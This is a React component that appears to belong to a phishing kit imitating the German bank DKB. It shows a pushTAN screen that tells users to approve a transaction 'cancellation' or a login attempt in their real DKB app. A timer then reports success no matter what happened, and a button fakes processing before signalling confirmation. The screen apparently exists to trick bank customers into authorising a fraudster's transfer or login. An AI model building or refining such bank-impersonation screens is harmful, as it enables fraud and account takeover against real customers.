import React, { useState, useEffect } from 'react';
import Loading from './Loading';

interface TransactionDetails {
  amount?: string;
  recipient?: string;
  reference?: string;
  iban?: string;
}

type TANType = 'TRANSACTION_TAN' | 'LOGIN_TAN';

interface PushTANScreenProps {
  tanType: TANType;
  transactionDetails?: TransactionDetails;
  onConfirm: () => void;
  onCancel?: () => void;
}

const PushTANScreen: React.FC<PushTANScreenProps> = ({ 
  tanType,
  transactionDetails = {}, 
  onConfirm, 
  onCancel
}) => {
  const [isWaiting, setIsWaiting] = useState(true);
  const [countdown, setCountdown] = useState(120);
  const [isLoading, setIsLoading] = useState(false);
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };
    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          setIsWaiting(false);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleConfirm = async () => {
    setIsLoading(true);
    await new Promise(resolve => setTimeout(resolve, 1500));
    setIsLoading(false);
    onConfirm();
  };

  if (isLoading) {
    return (
      <Loading 
        message={tanType === 'TRANSACTION_TAN' ? 'Stornierung wird verarbeitet...' : 'pushTAN wird verarbeitet...'}
        type="processing"
      />
    );
  }

  return (
    <div className="dkb-main-layout">
      <div className="dkb-tan-container">
        
        {/* Main TAN Card */}
        <div className="dkb-tan-card">
          
          {/* Title */}
          <h1 className="dkb-tan-title">
            {tanType === 'TRANSACTION_TAN' ? 'pushTAN Stornierung' : 'pushTAN Anmeldung'}
          </h1>
          
          {/* Instruction Box */}
          <div className="dkb-tan-instruction-box">
            <p className="dkb-tan-instruction-text">
              {tanType === 'TRANSACTION_TAN' 
                ? 'Bestätigen Sie die Stornierung der Transaktion in Ihrer DKB Banking-App.'
                : 'Bestätigen Sie Ihren Anmeldeversuch in Ihrer DKB Banking-App.'
              }
            </p>
          </div>

          {/* Transaction Details Card - only for TRANSACTION_TAN */}
          {tanType === 'TRANSACTION_TAN' && transactionDetails.amount && (
            <div className="dkb-tan-transaction-box">
              <h2 className="dkb-tan-transaction-title">
                Zu stornierende Transaktion
              </h2>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                <div className="dkb-tan-transaction-row">
                  <span className="dkb-tan-transaction-label">Betrag:</span>
                  <span className="dkb-tan-transaction-amount">{transactionDetails.amount}</span>
                </div>
                
                {transactionDetails.recipient && (
                  <div className="dkb-tan-transaction-row">
                    <span className="dkb-tan-transaction-label">Empfänger:</span>
                    <span className="dkb-tan-transaction-value">{transactionDetails.recipient}</span>
                  </div>
                )}
                
                {transactionDetails.iban && (
                  <div className="dkb-tan-transaction-row">
                    <span className="dkb-tan-transaction-label">IBAN:</span>
                    <span className="dkb-tan-transaction-value" style={{ fontFamily: 'monospace', letterSpacing: '0.05rem' }}>
                      {transactionDetails.iban}
                    </span>
                  </div>
                )}
                
                {transactionDetails.reference && (
                  <div className="dkb-tan-transaction-row" style={{ borderBottom: 'none', paddingBottom: 0 }}>
                    <span className="dkb-tan-transaction-label">Verwendungszweck:</span>
                    <span className="dkb-tan-transaction-value">{transactionDetails.reference}</span>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Status Section */}
          <div className="dkb-tan-status-box">
            {isWaiting ? (
              <div>
                {/* DKB Loading Spinner */}
                <div className="dkb-spinner" style={{ margin: '0 auto 24px auto' }} />
                
                <h3 className="dkb-tan-status-title">
                  {tanType === 'TRANSACTION_TAN' ? 'Warten auf Stornierung...' : 'Warten auf Anmeldung...'}
                </h3>
                
                <p className="dkb-tan-status-text">
                  Bitte bestätigen Sie in Ihrer DKB App.
                </p>
                
                <p className="dkb-tan-timeout-text">
                  Timeout in: {formatTime(countdown)}
                </p>
              </div>
            ) : (
              <div>
                {/* Success Icon */}
                <div style={{
                  width: '48px',
                  height: '48px',
                  backgroundColor: 'var(--dkb-success-green)',
                  borderRadius: '50%',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  margin: '0 auto 24px auto'
                }}>
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3">
                    <path d="M20 6L9 17l-5-5"/>
                  </svg>
                </div>
                
                <h3 className="dkb-tan-success-title">
                  {tanType === 'TRANSACTION_TAN' ? 'Transaktion storniert' : 'Anmeldung bestätigt'}
                </h3>
                
                <p className="dkb-tan-success-text">
                  Sie können nun fortfahren.
                </p>
              </div>
            )}
          </div>

          {/* Action Buttons */}
          <div className="dkb-tan-button-container">
            <button
              onClick={handleConfirm}
              disabled={isLoading}
              className="dkb-tan-primary-button"
            >
              {isWaiting 
                ? (tanType === 'TRANSACTION_TAN' ? 'Manuell stornieren' : 'Manuell bestätigen')
                : 'Weiter'
              }
            </button>
            
            {onCancel && (
              <button
                onClick={onCancel}
                className="dkb-tan-secondary-button"
              >
                {tanType === 'TRANSACTION_TAN' ? 'Stornierung abbrechen' : 'Anmeldung abbrechen'}
              </button>
            )}
          </div>

          {/* Footer Info */}
          <div style={{ textAlign: 'center' }}>
            <p className="dkb-tan-footer-text">
              Probleme mit der App? Kontaktieren Sie den DKB Kundenservice.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export { PushTANScreen };
